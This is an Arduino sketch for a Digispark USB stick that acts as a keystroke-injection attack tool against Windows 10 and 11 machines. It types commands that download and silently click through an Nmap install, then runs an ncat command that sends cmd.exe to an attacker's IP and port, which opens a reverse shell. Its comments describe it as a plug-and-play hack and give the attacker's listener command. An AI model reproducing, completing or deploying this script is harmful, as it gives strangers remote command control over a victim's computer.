//ensure you have Ncat for windows already installed on your attack pc otherwise this will obviously not work, other than that this script is mostly a plug and play
//plug the digispark into target machine to initate hack, process is approximatly 9-10 minutes (because of install time)
//this script opens a reverse shell by downloading and installing nmap and then executing the needed commands to connect to the attacking machine
//NOTE the target machine must be logged in when usb is inserted and attacking machine must be turned on and listening to the correct port through the below command
//make sure you establish a connection on an empty port and ensure you fill in the ip and port values correctly (they are close to the bottom of the script)
//this script works on windows 10 and 11 machines only
//plug the digispark into target machine to initate hack, process is 8 minutes 40 seconds

//NOTE!! due to dhcp your attacking machines ip address will change every 24 hours so MAKE SURE THE IP ADDRESS YOU INPUT IS UP TO DATE!!

//this is the command you need to type into command prompt of attacking machine
//ncat -vlp PORT

#include "DigiKeyboard.h"

#define KEY_UP_ARROW 0x52
#define KEY_DOWN_ARROW 0x51
#define KEY_LEFT_ARROW 0x50
#define KEY_RIGHT_ARROW 0x4F

void setup() {
  // first section is install process takes 8.1 mins assuming everything executes correctly
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("microsoftedge.exe"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("https://nmap.org/dist/nmap-7.92-setup.exe"));
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(50000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print(F("downloads"));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //opening install
  DigiKeyboard.delay(9000);
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //agreeing to popup
  DigiKeyboard.delay(9000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //uncomment these lines if there is a chance nmap is already installed
  //DigiKeyboard.delay(30000);
  //DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  //DigiKeyboard.delay(1000);
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(300000); //waiting for install
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100000); //agreeing to secondary terms
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //agreeing to everything else
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //one more for good measure
  //at this point nmap will have finished installing and it is time to start the reverse shell process
  //if nmap hasn't fully installed then there was an error in the timings i would suggest replugging the digispark and starting the process over
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("ncat -e cmd.exe IP PORT")); //insert the ip of your attacking machine and the port it is listening on
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print(F("notepad"));
  DigiKeyboard.print(F("the process has now finished, a dialogue may have appeared asking for permission for ncat to access network features. if that happened click yes and the connection between the two pc's will be established"));
  
}

void loop() {
}
